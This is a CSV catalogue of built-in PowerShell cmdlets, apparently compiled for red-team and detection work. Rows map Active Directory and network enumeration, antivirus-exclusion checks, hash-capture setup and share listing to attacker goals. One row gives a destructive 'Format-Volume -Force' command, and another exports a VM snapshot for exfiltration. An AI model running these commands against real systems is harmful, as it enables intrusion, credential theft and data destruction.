"Name","Description","Updated","Toolsets","Commands","Commands_Command","Commands_Description","Commands_Usecases","Commands_Function","Commands_Comments","Commands_MitreAttack","Resources","Detections","Contributors","Contributors_Name","Contributors_Handle","Detections_Port","is_legit"
"Get-NetRoute","Gets the IP route information from the IP routing table","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-NetRoute -CimSession $s","List routing table","Identify network routes","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetNeighbor","Gets neighbor cache entries","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-NetNeighbor -CimSession $s | select InterfaceIndex,IPAddress,AddressFamily,LinkLayerAddress,State,InterfaceAlias | ft","List ARP entries","Identify which devices are in the same subnet","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetNatStaticMapping","Gets static mappings configured on NAT instances","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetNatStaticMapping -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetNatSession","Gets all active NAT sessions","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetNatSession -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetNatGlobal","Retrieves global settings for all NAT instances on a computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetNatGlobal -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetNatExternalAddress","Gets external addresses configured for NAT instances","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetNatExternalAddress -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetNat","Gets NAT objects","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetNat -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetIPInterface","Gets an IP interface","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetIPInterface -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetIPAddress","Gets the IP address configuration","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-NetIPAddress -CimSession $s | Sort InterfaceIndex | ft -Autosize InterfaceIndex, InterfaceAlias, AddressFamily, IPAddress, PrefixLength","List IP addresses of the various interfaces","Identify whether a machine might be dual-homed","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetFirewallRule","Retrieves firewall rules from the target computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetFirewallRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetEventSession","Gets network event sessions","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-NetEventSession -Name sess -CimSession $s","Get status of an event session","Sniff authentication traffic on a domain controller and locally crack the hashes","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See all details in [New-NetEventSession](../New-NetEventSession)''-|-''PowerShell Module: `NetEventPacketCapture`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetConnectionProfile","Gets a connection profile","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-NetConnectionProfile -CimSession $s","List active connection profiles","Determine what connection profiles are active on the network interfaces","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetConnection`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetAdapter","Gets the basic network adapter properties","2024-12-13","[''Builtin''-|-''CIMSession'']","","Get-NetAdapter -Name * -CimSession $s","List adapters","Identify whether a machine is dual-homed","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetAdapter`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-MpThreatDetection","Gets active and past malware threats that Windows Defender detected","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-MpThreatDetection -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-MpThreatCatalog","Gets known threats from the definitions catalog","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-MpThreatCatalog -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-MpThreat","Gets the history of threats detected on the computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-MpThreat -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-MpPreference","Gets preferences for the Windows Defender scans and updates","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-MpPreference -CimSession $s","Obtain the AV's configuration","Identify whether the AV is active and which exclusion paths are configured","Recon","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-MpComputerStatus","Gets the status of antimalware software on the computer","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-MpComputerStatus -CimSession $s","Check status of AV","Identify whether the AV is active","Recon","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-HotFix","Gets the hotfixes that are installed on local or remote computers","2023-08-25","Builtin","","Get-HotFix -ComputerName W10.ad.bitsadmin.com","List installed KBs","Feed them to Windows Exploit Suggester - Next Generation to identify what vulnerabilities the system is vulnerable to","Recon","PowerShell Module: `Microsoft.PowerShell.Management`","TA0043","https://blog.bitsadmin.com/windows-security-updates-for-hackers","None","","Arris Huijgen","bitsadmin","","false"
"Get-GPStarterGPO","Gets one Starter GPO or all Starter GPOs in a domain","2023-07-01","[''Builtin''-|-''TODO'']","","Get-GPStarterGPO","TODO","None","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-GPResultantSetOfPolicy","Gets and writes the RSoP information for a user, a computer, or both to a file","2023-07-01","[''Builtin''-|-''TODO'']","","Get-GPResultantSetOfPolicy","TODO","None","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-GPPermission","Gets the permission level for one or more security principals on a specified GPO","2023-07-01","[''RSAT''-|-''TODO'']","","Get-GPPermission","TODO","None","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-GPOReport","Generates a report either in XML or HTML format for a specified GPO or for all GPOs in a domain","2023-07-01","[''Builtin''-|-''RSAT''-|-''TODO'']","","[''Get-GPOReport -All -Domain ad.bitsadmin.com -Server DC1.ad.bitsadmin.com -ReportType Html -Path ""$pwd\domain.html""''-|-''Get-GPOReport -All -Domain ad.bitsadmin.com -Server DC1.ad.bitsadmin.com -ReportType Xml -Path ""$pwd\domain.xml""''-|-''Get-GPOReport'']","[''Get report in HTML''-|-''Get report in XML''-|-''TODO'']","[''Information on group policies''-|-''Information on group policies''-|-''None'']","[''Domain''-|-''Domain''-|-''Domain'']","[''PowerShell Module: `GroupPolicy`''-|-''PowerShell Module: `GroupPolicy`''-|-''PowerShell Module: `GroupPolicy`'']","[''None''-|-''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-GPO","Gets one GPO or all the GPOs in a domain","2023-07-01","[''Builtin''-|-''TODO'']","","Get-GPO","TODO","None","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-FileShare","Retrieves file share objects and their properties","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-FileShare -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-EtwTraceSession","Gets ETW trace sessions","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-EtwTraceSession -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `EventTracingManagement`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-EtwTraceProvider","Gets ETW trace providers","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-EtwTraceProvider -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `EventTracingManagement`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DnsServerForwarder","Gets forwarder configuration settings on a DNS server","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DnsServerForwarder -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DnsServerCache","Retrieves DNS server cache settings","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DnsServerCache -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DnsServer","Retrieves a DNS server configuration","2023-07-01","[''CIMSession''-|-''RSAT'']","","Get-DnsServer -CimSession $s","Show DNS server configuration","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DnsClientServerAddress","Gets DNS server IP addresses from the TCP/IP properties on an interface","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DnsClientServerAddress -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsClient`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DnsClientNrptRule","Retrieves the DNS client NRPT rules","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DnsClientNrptRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsClient`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DnsClientCache","Retrieves the contents of the DNS client cache","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-DnsClientCache -CimSession $s","List cached DNS entries","Reconnaissance on the network/Internet activities on the computer","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsClient`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DiskImage","Gets one or more disk image objects (virtual hard disk or ISO)","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-DiskImage -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-Disk","Gets one or more disks visible to the operating system","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-Disk -CimSession $s","List disks","Reconnaissance on disks","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerv4Lease","Gets one or more lease records from the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerv4Lease -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerv4FilterList","Gets the enabled state of the allow filter list and deny filter list set on the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerv4FilterList -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerv4Filter","Gets the list of all MAC addresses from the allow list or the deny list on the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerv4Filter -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerv4DnsSetting","Gets the DNS settings configured on the Dynamic Host Configuration Protocol (DHCP) server service for a specific scope, reservation, or server level","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerv4DnsSetting -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerSetting","Gets the configuration parameters of the database of the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerSetting -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerInDC","Retrieves the list of authorized computers running the Dynamic Host Configuration Protocol (DHCP) server service from Active Directory (AD)","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerInDC -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerDnsCredential","Gets an account that the DHCP Server service uses to register or deregister client records on a DNS server","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerDnsCredential -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerDatabase","Gets the configuration parameters related to the database of the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerDatabase -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerAuditLog","Gets the configuration parameters related to the audit log of the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerAuditLog -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DfsnRootTarget","Gets settings for root targets of a DFS namespace","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DfsnRootTarget -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DFSN`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DfsnRoot","Gets settings for DFS namespaces","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DfsnRoot -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DFSN`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DfsnFolderTarget","Gets settings for targets of a DFS namespace folder","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DfsnFolderTarget -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DFSN`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DfsnFolder","Gets settings for a DFS namespace folder","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DfsnFolder -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DFSN`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-CimInstance","Gets the CIM instances of a class from a CIM server","2023-07-01","[''Builtin''-|-''CIMSession'']","","[''Get-CimInstance -CimSession $s -ClassName Win32_Process''-|-''Get-CimInstance -ClassName Win32_Process | % { [PSCustomObject]@{Name=$_.Name; User=$(Invoke-CimMethod -InputObject $_ -MethodName GetOwner).User } }''-|-''Get-CimInstance -Filter 'Name=""TermService""' -ClassName Win32_Service -CimSession $s'']","[''Get instances of a CIM class''-|-''Get instances of a CIM class''-|-''Get instances of a CIM class'']","[''List running processes''-|-''List running processes including username''-|-''Obtain the ""Remote Desktop Services"" service instance. This can now for example be used to launch or stop the service'']","[''Processes''-|-''Processes''-|-''Manage'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","[''T1047''-|-''T1047''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-CimClass","Gets a list of CIM classes in a specific namespace","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-CimClass -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-CimAssociatedInstance","Retrieves the CIM instances that are connected to a specific CIM instance by an association","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-CimAssociatedInstance -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ChildItem","Gets the files and folders in a file system drive.","2023-08-25","Builtin","","Get-ChildItem -LiteralPath '\\?\UNC\FS1.ad.bitsadmin.com\IT' -Depth 25 -Force | ForEach-Object { [PSCustomObject]@{Name=$_.Name; Mode=$_.Mode; Length=$_.Length; LastWriteTime=$_.LastWriteTime.ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss'); FullName=$_.FullName.Replace('\?\UNC','') } } | Export-Csv -Encoding UTF8 -NoTypeInformation FS1_IT.csv","Enumerate network share","Create file listing of network share to identify files that can be used for escalation","Data","PowerShell Module: `Microsoft.PowerShell.Management`","T1083","https://blog.bitsadmin.com/digging-for-secrets","None","","Arris Huijgen","bitsadmin","","false"
"Get-AppvVirtualProcess","Displays the virtual processes running on a computer","2023-07-01","[''RSAT''-|-''TODO'']","","Get-AppvVirtualProcess","TODO","None","Manage","PowerShell Module: `AppvClient`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADUser","Gets one or more Active Directory users","2023-07-01","RSAT","","[''Get-ADUser -Filter {DoesNotRequirePreauth -eq $true}''-|-''Get-ADUser -Filter {ServicePrincipalName -ne ""$null""} -Properties ServicePrincipalName''-|-''Get-ADUser -Filter {TrustedForDelegation -eq $true}''-|-''Get-ADUser -LDAPFilter ""(adminCount=1)"" -Server ad.bitsadmin.com'']","[''List users based on filter''-|-''List users based on filter''-|-''List users based on filter''-|-''List users based on LDAP filter'']","[''Enumerate aseproastable users''-|-''Enumerate kerberoastable users''-|-''Enumerate accounts that are trusted for unconstrained delegation''-|-''Enumerate users which [have been/are] members of at least one Administrative group'']","[''Domain''-|-''Domain''-|-''Domain''-|-''Domain'']","[''PowerShell Module: `ActiveDirectory`''-|-''PowerShell Module: `ActiveDirectory`''-|-''PowerShell Module: `ActiveDirectory`''-|-''PowerShell Module: `ActiveDirectory`'']","[''None''-|-''None''-|-''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADTrust","Returns all trusted domain objects in the directory","2023-07-01","RSAT","","Get-ADTrust -Filter * -Server ad.bitsadmin.com | ft Direction,Name,TrustType","Query AD trusts","Understand trust relations of the forest and domains","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADReplicationSubnet","Returns a specific Active Directory subnet or a set of AD subnets based on a specified filter.","2023-07-01","RSAT","","Get-ADReplicationSubnet -Filter * -Server ad.bitsadmin.com | select Name,Location,Site","List replication subnets","Enumerate subnets in use in the domain; useful to add LOFL tun2socks routes","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADOrganizationalUnit","Gets one or more Active Directory organizational units","2023-07-01","RSAT","","Get-ADOrganizationalUnit 'OU=Domain Controllers,DC=ad,DC=bitsadmin,DC=com'","Obtain information about OU","Learn which policies are applied to an OU","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADObject","Gets one or more Active Directory objects","2023-07-01","RSAT","","Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne ""$null""} -Properties msDS-AllowedToDelegateTo, userAccountControl","Query AD Objects using filter","Enumerate users and computers with constrained delegation enabled","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADGroupMember","Gets the members of an Active Directory group","2023-07-01","RSAT","","Get-ADGroupMember ""Domain Admins"" -Recursive -Server ad.bitsadmin.com","List all members of a group","Understand interesting targets in the environment","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADGroup","Gets one or more Active Directory groups","2023-07-01","RSAT","","Get-ADGroup -Filter * -Server ad.bitsadmin.com","List all groups","Enumerate groups","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADForest","Gets an Active Directory forest","2023-07-01","RSAT","","Get-ADForest -Server ad.bitsadmin.com","Get forest","Enumerate information about forest","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADDomainController","Gets one or more Active Directory domain controllers based on discoverable services criteria, search parameters or by providing a domain controller identifier, such as the NetBIOS name","2023-07-01","RSAT","","[''Get-ADDomainController -Filter * -Server ad.bitsadmin.com''-|-''Get-ADDomainController -Discover -Service GlobalCatalog -DomainName ad.bitsadmin.com'']","[''List all domain controllers''-|-''List domain controllers'']","[''Enumerate all domain controllers of a domain''-|-''Obtain hostname and IP of a GC domain controller'']","[''Domain''-|-''Domain'']","[''PowerShell Module: `ActiveDirectory`''-|-''PowerShell Module: `ActiveDirectory`'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADDomain","Gets an Active Directory domain","2023-07-01","RSAT","","Get-ADDomain ad.bitsadmin.com","Get domain","Get information about the domain","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADComputerServiceAccount","Gets the service accounts hosted by a computer","2023-07-01","[''RSAT''-|-''TODO'']","","Get-ADComputerServiceAccount","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADComputer","Gets one or more Active Directory computers","2023-07-01","RSAT","","[''Get-ADComputer -SearchBase ""OU=Domain Controllers,DC=ad,DC=bitsadmin,DC=com"" -Filter *''-|-''Get-ADComputer -Filter 'OperatingSystem -like ""*Server 2008*""' -Properties OperatingSystem'']","[''Query computers from specific OU''-|-''Query computers with specific attribute'']","[''Query list of domain controllers''-|-''Identify computers running an unsupported operating system'']","[''Domain''-|-''Domain'']","[''PowerShell Module: `ActiveDirectory`''-|-''PowerShell Module: `ActiveDirectory`'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Format-Volume","Formats one or more existing volumes or a new volume on an existing partition","2023-07-01","[''Builtin''-|-''CIMSession'']","","Format-Volume -CimSession $s -DriveLetter D -Force","Format volume","Affect availability of data on a volume","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","[''T1485''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Find-NetRoute","Finds the best local IP address and the best route to reach a remote address","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Find-NetRoute -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Export-VMSnapshot","Exports a virtual machine checkpoint to disk","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Export-VMSnapshot -Name 'VM snapshot' -VMName 'Windows 10 22H2' -Path C:\tmp -CimSession $s","Create snapshot of VM","Create a snapshot to then exfiltrate it over the network","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Next, using [Copy-Item](../Copy-Item) the snapshot can be copied locally''-|-''PowerShell Module: `Hyper-V`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
